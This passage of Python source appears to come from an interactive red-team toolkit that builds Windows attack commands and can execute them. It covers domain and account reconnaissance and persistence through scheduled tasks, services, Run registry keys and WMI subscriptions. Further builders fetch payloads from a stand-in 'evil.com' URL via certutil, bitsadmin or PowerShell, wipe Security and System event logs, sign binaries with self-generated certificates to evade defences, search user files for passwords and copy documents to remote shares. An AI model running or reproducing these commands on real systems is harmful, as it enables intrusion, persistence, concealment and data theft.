                target = Prompt.ask("DNS target", default="example.com")
                record_type = Prompt.ask("Record type", choices=['A', 'MX', 'NS', 'ANY'], default='A')
                cmd = f'nslookup -type={record_type} {target}'
        
        elif method == 'accounts':
            tool = Prompt.ask("Tool", choices=['net', 'whoami'], default='net')
            
            if tool == 'net':
                scope = Prompt.ask("Scope", choices=['local', 'domain', 'groups'], default='local')
                
                if scope == 'local':
                    cmd = 'net user'
                elif scope == 'domain':
                    cmd = 'net group /domain'
                else:
                    group = Prompt.ask("Group name", default="Domain Admins")
                    cmd = f'net group "{group}" /domain'
            
            else:
                detail = Prompt.ask("Detail level", choices=['basic', 'all', 'groups', 'priv'], default='all')
                
                if detail == 'all':
                    cmd = 'whoami /all'
                elif detail == 'groups':
                    cmd = 'whoami /groups'
                elif detail == 'priv':
                    cmd = 'whoami /priv'
                else:
                    cmd = 'whoami'
        
        elif method == 'system':
            tool = Prompt.ask("Tool", choices=['systeminfo', 'wmic'], default='systeminfo')
            
            if tool == 'systeminfo':
                target = Prompt.ask("Target (optional)", default="")
                if target:
                    cmd = f'systeminfo /s {target}'
                else:
                    cmd = 'systeminfo'
            else:
                query = Prompt.ask("WMI query", choices=['os', 'processes', 'services', 'software'], default='os')
                
                if query == 'os':
                    cmd = 'wmic os get name,version'
                elif query == 'processes':
                    cmd = 'wmic process list'
                elif query == 'services':
                    cmd = 'wmic service list'
                else:
                    cmd = 'wmic product get name,version'
        
        elif method == 'sessions':
            tool = Prompt.ask("Tool", choices=['quser', 'qwinsta'], default='quser')
            target = Prompt.ask("Target (optional)", default="")
            
            if tool == 'quser':
                if target:
                    cmd = f'quser /server:{target}'
                else:
                    cmd = 'quser'
            else:
                if target:
                    cmd = f'qwinsta /server:{target}'
                else:
                    cmd = 'qwinsta'
        
        elif method == 'shares':
            target = Prompt.ask("Target (optional)", default="")
            if target:
                cmd = f'net view \\\\{target}'
            else:
                cmd = 'net share'
        
        elif method == 'domain':
            tool = Prompt.ask("Tool", choices=['net', 'nltest'], default='net')
            
            if tool == 'net':
                cmd = 'net view /domain'
            else:
                action = Prompt.ask("Action", choices=['dclist', 'trusts', 'dc'], default='dclist')
                
                if action == 'dclist':
                    domain = Prompt.ask("Domain (optional)", default="")
                    if domain:
                        cmd = f'nltest /dclist:{domain}'
                    else:
                        cmd = 'nltest /dclist'
                elif action == 'trusts':
                    cmd = 'nltest /domain_trusts'
                else:
                    domain = Prompt.ask("Domain", default="example.com")
                    cmd = f'nltest /dsgetdc:{domain}'
        
        self._display_generated_command(console, cmd, method, session_data)
    
    def _build_persistence_command(self, console: Console, session_data: dict):
        """Build persistence command"""
        console.print("[bold]Persistence Command Builder[/bold]\n")
        
        method = Prompt.ask(
            "Persistence method",
            choices=['schtasks', 'sc', 'reg', 'wmi'],
            default='schtasks'
        )
        
        if method == 'schtasks':
            task_name = Prompt.ask("Task name", default="UpdateTask")
            command = Prompt.ask("Command to execute", default="powershell.exe -File script.ps1")
            schedule = Prompt.ask("Schedule", choices=['onlogon', 'onstart', 'daily', 'hourly'], default='onlogon')
            user = Prompt.ask("Run as user", choices=['SYSTEM', 'CurrentUser', 'Custom'], default='SYSTEM')
            
            if user == 'SYSTEM':
                user_part = ' /ru SYSTEM'
            elif user == 'CurrentUser':
                user_part = ''
            else:
                custom_user = Prompt.ask("Custom username", default="")
                user_part = f' /ru {custom_user}'
            
            cmd = f'schtasks /create /tn {task_name} /tr "{command}" /sc {schedule}{user_part}'
            
            if Confirm.ask("Run task immediately?", default=False):
                run_cmd = f'schtasks /run /tn {task_name}'
                cmd = f"{cmd}\n{run_cmd}"
        
        elif method == 'sc':
            service_name = Prompt.ask("Service name", default="UpdateService")
            command = Prompt.ask("Command to execute", default="C:\\Windows\\System32\\svchost.exe -k netsvcs")
            start_type = Prompt.ask("Start type", choices=['auto', 'demand', 'disabled'], default='auto')
            
            cmd = f'sc create {service_name} binPath= "{command}" start= {start_type}'
            
            if Confirm.ask("Start service?", default=False):
                start_cmd = f'sc start {service_name}'
                cmd = f"{cmd}\n{start_cmd}"
        
        elif method == 'reg':
            location = Prompt.ask("Registry location", choices=['HKCU_Run', 'HKLM_Run', 'HKCU_Startup'], default='HKCU_Run')
            key_name = Prompt.ask("Key name", default="Update")
            command = Prompt.ask("Command to execute", default="powershell.exe -File script.ps1")
            
            if location == 'HKCU_Run':
                reg_path = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            elif location == 'HKLM_Run':
                reg_path = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            else:
                reg_path = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
            
            cmd = f'reg add {reg_path} /v {key_name} /t REG_SZ /d "{command}" /f'
        
        elif method == 'wmi':
            filter_name = Prompt.ask("Event filter name", default="UpdateFilter")
            consumer_name = Prompt.ask("Event consumer name", default="UpdateConsumer")
            command = Prompt.ask("Command to execute", default="calc.exe")
            
            console.print("[yellow]WMI Event Subscription (simplified):[/yellow]")
            cmd = f'''wmic /namespace:\\\\root\\subscription PATH __EventFilter Create Name="{filter_name}", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
wmic /namespace:\\\\root\\subscription PATH CommandLineEventConsumer Create Name="{consumer_name}", ExecutablePath="{command}"
wmic /namespace:\\\\root\\subscription PATH __FilterToConsumerBinding Create Filter="__EventFilter.Name=\\"{filter_name}\\"", Consumer="CommandLineEventConsumer.Name=\\"{consumer_name}\\""'''
        
        self._display_generated_command(console, cmd, method, session_data)
    
    def _build_evasion_command(self, console: Console, session_data: dict, use_case: str):
        """Build defense evasion command"""
        console.print(f"[bold]Defense Evasion Command Builder - {use_case}[/bold]\n")
        
        # Check for MADCert integration
        madcert_available = False
        code_signing_certs = []
        try:
            from modules.madcert_integration import MADCertGenerator
            madcert_gen = MADCertGenerator(console, session_data)
            all_certs = madcert_gen.list_certificates()
            code_signing_certs = [c for c in all_certs if c.get('type') == 'Client' and 'codeSigning' in str(c.get('key_usage', [])).lower()]
            if code_signing_certs:
                madcert_available = True
                console.print(f"[green]MADCert integration: {len(code_signing_certs)} code signing certificate(s) available[/green]\n")
        except Exception:
            pass
        
        if 'Download' in use_case:
            method = Prompt.ask(
                "Download method",
                choices=['certutil', 'bitsadmin', 'curl', 'powershell'],
                default='certutil'
            )
            
            url = Prompt.ask("File URL", default="http://evil.com/file.exe")
            output = Prompt.ask("Output path", default="file.exe")
            
            if method == 'certutil':
                cmd = f'certutil.exe -urlcache -split -f {url} {output}'
            elif method == 'bitsadmin':
                job_name = Prompt.ask("BITS job name", default="UpdateJob")
                cmd = f'bitsadmin /transfer {job_name} {url} {output}'
            elif method == 'curl':
                cmd = f'curl.exe {url} -o {output}'
            else:
                cmd = f'powershell.exe -Command "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{output}\')"'
        
        elif 'Clear' in use_case:
            log_type = Prompt.ask("Log type", choices=['Security', 'System', 'Application', 'All'], default='Security')
            
            if log_type == 'All':
                cmd = 'wevtutil.exe cl Security\nwevtutil.exe cl System\nwevtutil.exe cl Application'
            else:
                cmd = f'wevtutil.exe cl {log_type}'
        
        else:
            evasion_methods = ['certutil_encode', 'certutil_sign', 'findstr']
            if madcert_available:
                evasion_methods.insert(1, 'sign_with_madcert')
            
            method = Prompt.ask("Evasion method", choices=evasion_methods, default='certutil_encode')
            
            if method == 'certutil_encode':
                file_path = Prompt.ask("File to encode", default="file.exe")
                encoded_file = Prompt.ask("Encoded output", default="file.b64")
                cmd = f'certutil.exe -encode {file_path} {encoded_file}'
            
            elif method == 'certutil_sign':
                file_path = Prompt.ask("File to sign", default="file.exe")
                cert_file = Prompt.ask("Certificate file (.pfx)", default="cert.pfx")
                password = Prompt.ask("Certificate password (optional)", default="", password=True)
                
                if password:
                    cmd = f'certutil.exe -sign "{file_path}" "{cert_file}" {password}'
                else:
                    cmd = f'signtool.exe sign /f "{cert_file}" "{file_path}"'
                    console.print("[dim]Note: Using signtool.exe for signing[/dim]\n")
            
            elif method == 'sign_with_madcert':
                if not code_signing_certs:
                    console.print("[yellow]No code signing certificates found[/yellow]")
                    return
                
                # List available certificates
                cert_table = Table(title="Available Code Signing Certificates", box=box.SIMPLE)
                cert_table.add_column("Index", style="cyan")
                cert_table.add_column("Name", style="white")
                cert_table.add_column("CA", style="dim white")
                
                for i, cert in enumerate(code_signing_certs, 1):
                    cert_table.add_row(str(i), cert['name'], cert.get('ca_name', 'N/A'))
                
                console.print(cert_table)
                console.print()
                
                cert_idx = int(Prompt.ask("Select certificate", choices=[str(i) for i in range(1, len(code_signing_certs)+1)])) - 1
                selected_cert = code_signing_certs[cert_idx]
                
                file_path = Prompt.ask("File to sign", default="file.exe")
                
                # Generate signing command
                cert_file = selected_cert['cert_file']
                key_file = selected_cert['key_file']
                
                console.print(f"\n[bold]Signing with:[/bold] {selected_cert['name']}")
                console.print(f"[dim]Certificate: {cert_file}[/dim]")
                console.print(f"[dim]Private Key: {key_file}[/dim]\n")
                
                # Use signtool or certutil
                sign_method = Prompt.ask("Signing method", choices=['signtool', 'certutil', 'powershell'], default='signtool')
                
                if sign_method == 'signtool':
                    # Convert to PFX if needed
                    if cert_file.endswith('.crt'):
                        pfx_path = cert_file.replace('.crt', '.pfx')
                        password = Prompt.ask("PFX password (for conversion)", default="", password=True)
                        console.print(f"[yellow]Step 1: Convert certificate to PFX[/yellow]")
                        convert_cmd = f'openssl pkcs12 -export -out "{pfx_path}" -inkey "{key_file}" -in "{cert_file}" -password pass:{password}'
                        console.print(f"[cyan]{convert_cmd}[/cyan]\n")
                        cmd = f'{convert_cmd}\n\n'
                        cmd += f'signtool.exe sign /f "{pfx_path}" /p {password} "{file_path}"'
                    else:
                        password = Prompt.ask("PFX password (optional)", default="", password=True)
                        if password:
                            cmd = f'signtool.exe sign /f "{cert_file}" /p {password} "{file_path}"'
                        else:
                            cmd = f'signtool.exe sign /f "{cert_file}" "{file_path}"'
                    
                    # Add timestamp option
                    if Confirm.ask("Add timestamp?", default=True):
                        timestamp_url = Prompt.ask("Timestamp URL", default="http://timestamp.digicert.com")
                        cmd += f' /t {timestamp_url}'
                
                elif sign_method == 'certutil':
                    pfx_path = cert_file.replace('.crt', '.pfx')
                    password = Prompt.ask("PFX password (optional)", default="", password=True)
                    if password:
                        cmd = f'certutil.exe -sign "{file_path}" "{pfx_path}" {password}'
                    else:
                        cmd = f'certutil.exe -sign "{file_path}" "{pfx_path}"'
                
                else:
                    # PowerShell signing
                    cmd = f'''powershell.exe -Command "$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('{cert_file}'); Set-AuthenticodeSignature -FilePath '{file_path}' -Certificate $cert"'''
            
            else:
                search_term = Prompt.ask("Search term", default="password")
                search_path = Prompt.ask("Search path", default="C:\\Users\\*.txt")
                cmd = f'findstr /s /i "{search_term}" {search_path}'
        
        self._display_generated_command(console, cmd, method, session_data)
    
    def _build_collection_command(self, console: Console, session_data: dict):
        """Build collection/exfiltration command"""
        console.print("[bold]Collection Command Builder[/bold]\n")
        
        method = Prompt.ask(
            "Copy method",
            choices=['robocopy', 'xcopy', 'copy'],
            default='robocopy'
        )
        
        source = Prompt.ask("Source path", default="C:\\Users\\user\\Documents")
        destination = Prompt.ask("Destination", default="\\\\target\\share\\docs")
        
        if method == 'robocopy':
            options = []
            if Confirm.ask("Mirror (delete destination files not in source)?", default=False):
                options.append('/MIR')
            if Confirm.ask("Copy subdirectories?", default=True):
                options.append('/E')
            if Confirm.ask("Copy all file info?", default=False):
                options.append('/COPYALL')
            
            opts_str = ' ' + ' '.join(options) if options else ''
            cmd = f'robocopy "{source}" "{destination}"{opts_str}'
        
        elif method == 'xcopy':
            options = []
            if Confirm.ask("Copy subdirectories?", default=True):
                options.append('/E')
            if Confirm.ask("Include empty directories?", default=False):
                options.append('/I')
            if Confirm.ask("Suppress prompts?", default=True):
                options.append('/Y')
            
            opts_str = ' ' + ' '.join(options) if options else ''
            cmd = f'xcopy "{source}" "{destination}"{opts_str}'
        
        else:
            if Confirm.ask("Copy all files (*.*)?", default=True):
                source = source.rstrip('\\') + '\\*.*'
            cmd = f'copy "{source}" "{destination}"'
        
        self._display_generated_command(console, cmd, method, session_data)
    
    def _build_certificate_signing_command(self, console: Console, session_data: dict):
        """Build certificate signing command with MADCert integration"""
        console.print("[bold]Certificate-Based File Signing[/bold]\n")
        
        # Check MADCert availability
        try:
            from modules.madcert_integration import MADCertGenerator
            madcert_gen = MADCertGenerator(console, session_data)
            all_certs = madcert_gen.list_certificates()
            
            # Find code signing certificates
            code_signing_certs = []
            for cert in all_certs:
                if cert.get('type') == 'Client':
                    key_usage = cert.get('key_usage', [])
                    if isinstance(key_usage, list):
                        if any('codeSigning' in str(k).lower() or 'digitalSignature' in str(k).lower() for k in key_usage):
                            code_signing_certs.append(cert)
                    elif isinstance(key_usage, str) and ('codeSigning' in key_usage.lower() or 'digitalSignature' in key_usage.lower()):
                        code_signing_certs.append(cert)
            
            if not code_signing_certs:
                console.print("[yellow]No code signing certificates found in MADCert module[/yellow]")
                console.print("[dim]Generate a code signing certificate in Module 8 first[/dim]\n")
                
                if Confirm.ask("[bold]Generate code signing certificate now?[/bold]", default=False):
                    # Quick cert generation
                    signer_name = Prompt.ask("Signer name", default="CodeSigner")
                    
                    # Check for CA
                    cas = [c for c in all_certs if c.get('type') == 'CA']
                    if not cas:
                        console.print("[yellow]No CA found. Generating CA first...[/yellow]")
                        ca_name = Prompt.ask("CA name", default="MyCA")
                        try:
                            ca_info = madcert_gen.generate_ca_certificate(ca_name)
                            cas = [ca_name]
                        except Exception as e:
                            console.print(f"[red]CA generation failed: {e}[/red]")
                            return
                    
                    ca_name = cas[0] if isinstance(cas[0], str) else cas[0]['name']
                    try:
                        cert_info = madcert_gen.generate_code_signing_certificate(signer_name, ca_name)
                        code_signing_certs.append(cert_info)
                        console.print(f"[green]Code signing certificate generated: {cert_info['cert_file']}[/green]\n")
                    except Exception as e:
                        console.print(f"[red]Certificate generation failed: {e}[/red]")
                        return
                else:
                    # Use manual certificate path
                    cert_file = Prompt.ask("Certificate file path (.pfx or .crt)", default="cert.pfx")
                    key_file = Prompt.ask("Private key file path (if .crt)", default="")
                    method = 'manual'
            else:
                # List available certificates
                cert_table = Table(title="Available Code Signing Certificates", box=box.SIMPLE)
                cert_table.add_column("Index", style="cyan")
                cert_table.add_column("Name", style="white")
                cert_table.add_column("CA", style="dim white")
                cert_table.add_column("File", style="dim white")
                
                for i, cert in enumerate(code_signing_certs, 1):
                    cert_table.add_row(
                        str(i),
                        cert['name'],
                        cert.get('ca_name', 'N/A'),
                        os.path.basename(cert['cert_file'])
                    )
                
                console.print(cert_table)
                console.print()
                
                cert_idx = int(Prompt.ask("Select certificate", choices=[str(i) for i in range(1, len(code_signing_certs)+1)])) - 1
                selected_cert = code_signing_certs[cert_idx]
                cert_file = selected_cert['cert_file']
                key_file = selected_cert['key_file']
                method = 'madcert'
        
        except Exception as e:
            console.print(f"[yellow]MADCert integration unavailable: {e}[/yellow]")
            console.print("[dim]Using manual certificate path[/dim]\n")
            cert_file = Prompt.ask("Certificate file path (.pfx or .crt)", default="cert.pfx")
            key_file = Prompt.ask("Private key file path (if .crt)", default="")
            method = 'manual'
        
        # Get file to sign
        file_path = Prompt.ask("File to sign", default="file.exe")
        
        # Choose signing method
        sign_method = Prompt.ask(
            "Signing method",
            choices=['signtool', 'certutil', 'powershell', 'osslsigncode'],
            default='signtool'
        )
        
        if sign_method == 'signtool':
            # Convert to PFX if needed
            if cert_file.endswith('.crt') and key_file:
                pfx_path = cert_file.replace('.crt', '.pfx')
                password = Prompt.ask("PFX password", default="", password=True)
                
                # Generate PFX conversion command
                console.print(f"\n[yellow]Step 1: Convert certificate to PFX[/yellow]")
                convert_cmd = f'openssl pkcs12 -export -out "{pfx_path}" -inkey "{key_file}" -in "{cert_file}" -password pass:{password}'
                console.print(f"[cyan]{convert_cmd}[/cyan]\n")
                
                cmd = f'{convert_cmd}\n\n'
                cmd += f'signtool.exe sign /f "{pfx_path}" /p {password} "{file_path}"'
            else:
                password = Prompt.ask("PFX password (optional)", default="", password=True)
                if password:
                    cmd = f'signtool.exe sign /f "{cert_file}" /p {password} "{file_path}"'
                else:
                    cmd = f'signtool.exe sign /f "{cert_file}" "{file_path}"'
            
            # Add timestamp option
            if Confirm.ask("Add timestamp?", default=True):
                timestamp_url = Prompt.ask("Timestamp URL", default="http://timestamp.digicert.com")
                cmd += f' /t {timestamp_url}'
        
        elif sign_method == 'certutil':
            if cert_file.endswith('.pfx'):
                password = Prompt.ask("PFX password", default="", password=True)
                if password:
                    cmd = f'certutil.exe -sign "{file_path}" "{cert_file}" {password}'
                else:
                    cmd = f'certutil.exe -sign "{file_path}" "{cert_file}"'
            else:
                console.print("[yellow]certutil requires PFX format[/yellow]")
                return
        
        elif sign_method == 'powershell':
            if cert_file.endswith('.crt'):
                cmd = f'''powershell.exe -Command "$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('{cert_file}'); Set-AuthenticodeSignature -FilePath '{file_path}' -Certificate $cert"'''
            else:
                # PFX import and sign
                password = Prompt.ask("PFX password", default="", password=True)
                if password:
                    secure_pass = f'ConvertTo-SecureString -String "{password}" -Force -AsPlainText'
                else:
                    secure_pass = '""'
                
                cmd = f'''powershell.exe -Command "$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2('{cert_file}', {secure_pass}); Set-AuthenticodeSignature -FilePath '{file_path}' -Certificate $cert"'''
        
        else:
            # osslsigncode (open source alternative)
            if cert_file.endswith('.crt') and key_file:
                cmd = f'osslsigncode sign -certs "{cert_file}" -key "{key_file}" -in "{file_path}" -out "{file_path}.signed"'
            else:
                console.print("[yellow]osslsigncode requires separate cert and key files[/yellow]")
                return
        
        # Add verification command
        if Confirm.ask("Add verification command?", default=True):
            if sign_method == 'signtool':
                verify_cmd = f'\nsigntool.exe verify /pa "{file_path}"'
            elif sign_method == 'powershell':
                verify_cmd = f'\npowershell.exe -Command "Get-AuthenticodeSignature -FilePath \'{file_path}\'"'
            else:
                verify_cmd = f'\ncertutil.exe -verify "{file_path}"'
            
            cmd += verify_cmd
        
        self._display_generated_command(console, cmd, 'certificate_signing', session_data)
    
    def _display_generated_command(self, console: Console, cmd: str, method: str, session_data: dict):
        """Display generated command with options"""
        console.print(f"\n[bold green]Generated Command:[/bold green]\n")
        
        # Show command in a panel
        from rich.panel import Panel
        console.print(Panel(cmd, title=f"{method.upper()} Command", border_style="green"))
        
        console.print()
        
        # Show options
        options = []
        
        if Confirm.ask("[bold]Copy command?[/bold]", default=False):
            # Show command for manual copy
            console.print("\n[bold]Command to copy:[/bold]")
            console.print(Panel(cmd, border_style="cyan"))
            console.print("[dim]Command displayed above - copy manually[/dim]")
        
        if Confirm.ask("[bold]Execute command?[/bold]", default=False):
            lab_use = session_data.get('LAB_USE', 0)
            from modules.utils import execute_cmd, execute_powershell
            
            # Determine if PowerShell or CMD
            if 'powershell' in cmd.lower():
                exit_code, stdout, stderr = execute_powershell(cmd, lab_use=lab_use)
            else:
                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=lab_use)
            
            console.print(f"\n[bold]Execution Result:[/bold]")
            console.print(f"Exit Code: {exit_code}")
            if stdout:
                console.print(f"\n[green]Output:[/green]\n{stdout}")
            if stderr:
                console.print(f"\n[red]Error:[/red]\n{stderr}")
        
        if Confirm.ask("[bold]Save to file?[/bold]", default=False):
            filename = Prompt.ask("Filename", default="command.txt")
            try:
                with open(filename, 'w') as f:
                    f.write(cmd)
                console.print(f"[green]Command saved to {filename}[/green]")
            except Exception as e:
                console.print(f"[red]Error saving: {e}[/red]")
